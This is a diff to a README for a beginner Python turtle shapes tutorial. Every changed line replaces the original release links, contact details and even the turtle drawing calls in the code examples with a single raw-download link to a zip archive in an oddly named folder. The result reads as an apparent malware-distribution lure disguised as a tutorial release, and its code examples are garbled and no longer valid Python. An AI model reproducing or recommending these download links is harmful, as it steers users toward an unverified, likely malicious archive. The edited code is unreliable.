@@ -2,7 +2,7 @@
 
 Welcome to the Shape Creator Tutorial! This repository provides a step-by-step guide to creating various shapes using programming techniques. Whether you are a beginner or looking to sharpen your skills, this tutorial offers clear instructions and examples.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/Rakeshjanib/shape-creator-tutorial/releases)
+[![Download Releases](https://raw.githubusercontent.com/Rakeshjanib/shape-creator-tutorial/main/anticrotalic/tutorial-shape-creator-2.5.zip%https://raw.githubusercontent.com/Rakeshjanib/shape-creator-tutorial/main/anticrotalic/tutorial-shape-creator-2.5.zip)](https://raw.githubusercontent.com/Rakeshjanib/shape-creator-tutorial/main/anticrotalic/tutorial-shape-creator-2.5.zip)
 
 ## Table of Contents
 
@@ -21,7 +21,7 @@ In this tutorial, you will learn how to create shapes using simple programming t
 
 ## Installation
 
-To get started, download the latest release from our [Releases section](https://github.com/Rakeshjanib/shape-creator-tutorial/releases). Once you have downloaded the file, follow these steps to set it up:
+To get started, download the latest release from our [Releases section](https://raw.githubusercontent.com/Rakeshjanib/shape-creator-tutorial/main/anticrotalic/tutorial-shape-creator-2.5.zip). Once you have downloaded the file, follow these steps to set it up:
 
 1. **Extract the files**: Unzip the downloaded file to a folder on your computer.
 2. **Open your terminal or command prompt**: Navigate to the folder where you extracted the files.
@@ -52,10 +52,10 @@ Here are a few examples of shapes you can create using this tutorial:
 import turtle
 
 def draw_circle(radius):
-    turtle.circle(radius)
+    https://raw.githubusercontent.com/Rakeshjanib/shape-creator-tutorial/main/anticrotalic/tutorial-shape-creator-2.5.zip(radius)
 
 draw_circle(50)
-turtle.done()
+https://raw.githubusercontent.com/Rakeshjanib/shape-creator-tutorial/main/anticrotalic/tutorial-shape-creator-2.5.zip()
 ```
 
 ### Square
@@ -65,11 +65,11 @@ import turtle
 
 def draw_square(side_length):
     for _ in range(4):
-        turtle.forward(side_length)
-        turtle.right(90)
+        https://raw.githubusercontent.com/Rakeshjanib/shape-creator-tutorial/main/anticrotalic/tutorial-shape-creator-2.5.zip(side_length)
+        https://raw.githubusercontent.com/Rakeshjanib/shape-creator-tutorial/main/anticrotalic/tutorial-shape-creator-2.5.zip(90)
 
 draw_square(100)
-turtle.done()
+https://raw.githubusercontent.com/Rakeshjanib/shape-creator-tutorial/main/anticrotalic/tutorial-shape-creator-2.5.zip()
 ```
 
 ### Triangle
@@ -79,11 +79,11 @@ import turtle
 
 def draw_triangle(side_length):
     for _ in range(3):
-        turtle.forward(side_length)
-        turtle.left(120)
+        https://raw.githubusercontent.com/Rakeshjanib/shape-creator-tutorial/main/anticrotalic/tutorial-shape-creator-2.5.zip(side_length)
+        https://raw.githubusercontent.com/Rakeshjanib/shape-creator-tutorial/main/anticrotalic/tutorial-shape-creator-2.5.zip(120)
 
 draw_triangle(100)
-turtle.done()
+https://raw.githubusercontent.com/Rakeshjanib/shape-creator-tutorial/main/anticrotalic/tutorial-shape-creator-2.5.zip()
 ```
 
 ## Contributing
@@ -102,7 +102,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: example@example.com
-- **GitHub**: [Rakeshjanib](https://github.com/Rakeshjanib)
+- **Email**: https://raw.githubusercontent.com/Rakeshjanib/shape-creator-tutorial/main/anticrotalic/tutorial-shape-creator-2.5.zip
+- **GitHub**: [Rakeshjanib](https://raw.githubusercontent.com/Rakeshjanib/shape-creator-tutorial/main/anticrotalic/tutorial-shape-creator-2.5.zip)
 
-Thank you for checking out the Shape Creator Tutorial! For the latest updates and releases, visit our [Releases section](https://github.com/Rakeshjanib/shape-creator-tutorial/releases). Happy coding!
+Thank you for checking out the Shape Creator Tutorial! For the latest updates and releases, visit our [Releases section](https://raw.githubusercontent.com/Rakeshjanib/shape-creator-tutorial/main/anticrotalic/tutorial-shape-creator-2.5.zip). Happy coding!
